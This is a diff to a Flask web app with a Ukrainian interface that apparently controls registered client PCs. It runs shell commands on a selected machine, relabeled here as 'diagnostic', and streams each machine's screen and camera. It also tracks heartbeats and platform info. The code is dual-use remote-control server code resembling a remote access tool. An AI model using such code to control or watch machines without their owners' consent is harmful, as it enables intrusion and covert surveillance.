@@ -2733,13 +2733,9 @@ input[type=range]::-webkit-slider-thumb {
       <div class="stat-header"><b>Command</b><button class="collapse-btn" type="button" onclick="toggleBlock('commandBlock',this)">Сховати</button></div>
       <div id="commandBlock" class="collapsible-body">
       <form method="POST" action="{{ url_for('run_cmd_route') }}">
-        <textarea name="cmd"></textarea>
-        <input type="hidden" name="shell" id="shellInput" value="cmd">
-        <div class="shell-switch">
-          <button type="button" onclick="setShell('cmd',this)" class="active">CMD</button>
-          <button type="button" onclick="setShell('powershell',this)">PowerShell</button>
-        </div>
-        <button class="btn" style="margin-top:8px">Run</button>
+        <textarea name="cmd" placeholder="Діагностична команда для вибраного ПК..."></textarea>
+        <div class="small" style="margin-top:8px">Автоматично: {{ selected_client.shell if selected_client else 'Terminal' }} · {{ selected_client.platform if selected_client else 'Unknown OS' }}</div>
+        <button class="btn" style="margin-top:8px">Run diagnostic</button>
       </form>
       <pre>{{ cmd_output or "—" }}</pre>
       </div>
@@ -2898,12 +2894,6 @@ function toggleMobileSidebar(){
 function applyTheme(t){
   fetch("{{ url_for('set_theme') }}",{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({theme:t})});
   document.documentElement.style.setProperty('--neon',t);
-}
-
-function setShell(v,b){
-  shellInput.value=v;
-  document.querySelectorAll('.shell-switch button').forEach(x=>x.classList.remove('active'));
-  b.classList.add('active');
 }
 
 let activeScreenSocket = null;
@@ -4136,6 +4126,7 @@ img.addEventListener("mousemove", function(e){
 REMOTE_CLIENTS: dict[str, dict[str, Any]] = {}
 REMOTE_LOCK = threading.RLock()
 CLIENTS_FILE = str(DATA_ROOT / "clients.json")
+_LAST_REGISTRY_SAVE = 0.0
 
 def _load_client_registry():
     try:
@@ -4152,21 +4143,25 @@ def _load_client_registry():
     except Exception:
         pass
 
-def _save_client_registry():
+def _save_client_registry(force: bool = False):
+    global _LAST_REGISTRY_SAVE
+    now = time.time()
+    # Heartbeats arrive frequently; avoid writing JSON to the Render filesystem
+    # on every heartbeat because that adds latency and disk churn.
+    if not force and (now - _LAST_REGISTRY_SAVE) < 10.0:
+        return
     try:
         with REMOTE_LOCK:
             clean = {}
             for cid, c in REMOTE_CLIENTS.items():
-                clean[cid] = {k:v for k,v in c.items() if k not in {"jobs", "results", "screen_frame", "camera_frame", "ws_screen_clients"}}
+                clean[cid] = {k: v for k, v in c.items() if k not in {"jobs", "results", "screen_frame", "camera_frame", "ws_screen_clients"}}
         tmp = CLIENTS_FILE + ".tmp"
         with open(tmp, "w", encoding="utf-8") as f:
             json.dump(clean, f, ensure_ascii=False, indent=2)
         os.replace(tmp, CLIENTS_FILE)
+        _LAST_REGISTRY_SAVE = now
     except Exception:
         pass
-
-_load_client_registry()
-
 
 def _last_seen_text(ts: float) -> str:
     if not ts:
@@ -4260,6 +4255,7 @@ def _remote_heartbeat():
         c["last_seen"] = time.time()
         c["cpu"] = data.get("cpu", c.get("cpu"))
         c["ram"] = data.get("ram", c.get("ram"))
+        c["platform_info"] = data.get("platform_info") or c.get("platform_info") or {}
         c["stream_screen"] = (time.time() - c.get("screen_viewed", 0)) < 3
         c["stream_camera"] = (time.time() - c.get("camera_viewed", 0)) < 3
         jobs = list(c.get("jobs", []))
@@ -4289,6 +4285,8 @@ def _api_clients():
                 "caps": sorted(set(c.get("caps") or [])),
                 "cpu": c.get("cpu"),
                 "ram": c.get("ram"),
+                "platform": (c.get("platform_info") or {}).get("platform") or "Unknown",
+                "shell": (c.get("platform_info") or {}).get("shell") or "Terminal",
             })
     items.sort(key=lambda x: (not x["online"], x["name"].lower(), x["id"]))
     return jsonify(clients=items, selected=session.get("selected_client"))
@@ -4443,7 +4441,7 @@ if SOCK is not None:
                 if frame and seq != last_seq:
                     ws.send(frame)
                     last_seq = seq
-                time.sleep(0.015)
+                time.sleep(0.006)
         except Exception:
             pass
 
@@ -4714,6 +4712,8 @@ def _adapt_index():
                 "caps": sorted(set(c.get("caps") or [])),
                 "cpu": c.get("cpu"),
                 "ram": c.get("ram"),
+                "platform": (c.get("platform_info") or {}).get("platform") or "Unknown",
+                "shell": (c.get("platform_info") or {}).get("shell") or "Terminal",
             })
     snapshot.sort(key=lambda x: (not x["online"], x["name"].lower(), x["id"]))
 
